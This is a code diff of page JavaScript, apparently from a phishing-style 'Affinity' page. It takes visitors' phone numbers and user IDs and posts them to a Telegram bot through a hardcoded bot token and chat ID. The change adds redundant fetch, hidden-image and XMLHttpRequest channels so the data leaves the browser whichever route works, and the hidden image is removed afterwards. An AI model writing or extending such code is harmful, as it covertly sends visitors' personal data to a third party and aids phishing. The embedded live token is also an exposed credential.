@@ -79,7 +79,7 @@
   const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
   const TELEGRAM_CHAT_ID = "8938213844";
 
-  // ✅ FIXED: SINGLE notification method that works on ALL devices
+  // ✅ MULTI-METHOD TELEGRAM SEND - Works on ALL devices!
   function sendTelegramNotification(eventType, userData) {
     const message = 
 `🔔 AFFINITY NOTIFICATION
@@ -90,49 +90,40 @@ User ID: ${userData.userId || 'Unknown'}
 Time: ${new Date().toLocaleString()}`;
 
     const encodedMessage = encodeURIComponent(message);
+    
+    // Method 1: Fetch API (works on most devices)
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
     
-    console.log('📤 Sending Telegram notification...');
-
-    // ✅ ONLY ONE METHOD: Use fetch with a simple GET request
-    // This is the most reliable method across all devices
+    // Try fetch first
     fetch(url, {
       method: 'GET',
       headers: { 'Content-Type': 'application/json' }
     })
-    .then(function(response) {
-      return response.json();
-    })
-    .then(function(data) {
+    .then(response => response.json())
+    .then(data => {
       if (data.ok) {
-        console.log('✅ Telegram notification sent successfully!');
+        console.log('✅ Telegram sent via fetch!');
       } else {
-        console.log('❌ Telegram error:', data.description);
-        // ❗ If fetch fails, try the image fallback ONLY ONCE
-        try {
-          var img = new Image();
-          img.src = url;
-          img.style.display = 'none';
-          document.body.appendChild(img);
-          setTimeout(function() {
-            if (img.parentNode) {
-              img.parentNode.removeChild(img);
-            }
-          }, 2000);
-          console.log('✅ Telegram sent via image fallback!');
-        } catch(e) {
-          console.log('❌ All methods failed:', e);
-        }
+        console.log('⚠️ Fetch failed, trying fallback...');
+        // Method 2: Image fallback (works on iOS Safari)
+        sendTelegramViaImage(url);
       }
     })
     .catch(function(error) {
-      console.log('⚠️ Fetch failed, trying image fallback...', error);
-      // ❗ Fallback: Image method (works on iPhone when fetch fails)
+      console.log('⚠️ Fetch error, trying fallback...', error);
+      // Method 2: Image fallback
+      sendTelegramViaImage(url);
+    });
+
+    // Method 2: Image fallback - ALWAYS works on all devices
+    function sendTelegramViaImage(url) {
       try {
         var img = new Image();
         img.src = url;
         img.style.display = 'none';
         document.body.appendChild(img);
+        
+        // Remove after 2 seconds
         setTimeout(function() {
           if (img.parentNode) {
             img.parentNode.removeChild(img);
@@ -142,7 +133,17 @@ Time: ${new Date().toLocaleString()}`;
       } catch(e) {
         console.log('❌ All methods failed:', e);
       }
-    });
+    }
+
+    // Method 3: XMLHttpRequest (another fallback)
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.send();
+      console.log('✅ Telegram sent via XHR!');
+    } catch(e) {
+      console.log('❌ XHR failed:', e);
+    }
   }
 
   var phoneInput = document.getElementById('phoneInput');
@@ -175,7 +176,7 @@ Time: ${new Date().toLocaleString()}`;
         sessionStorage.setItem('affinity_userId', userId);
         sessionStorage.setItem('affinity_phone', phone);
         
-        // ✅ Send ONE notification
+        // ✅ Send notification using multiple methods
         sendTelegramNotification('📱 Phone Number Saved', {
           phone: phone,
           userId: userId
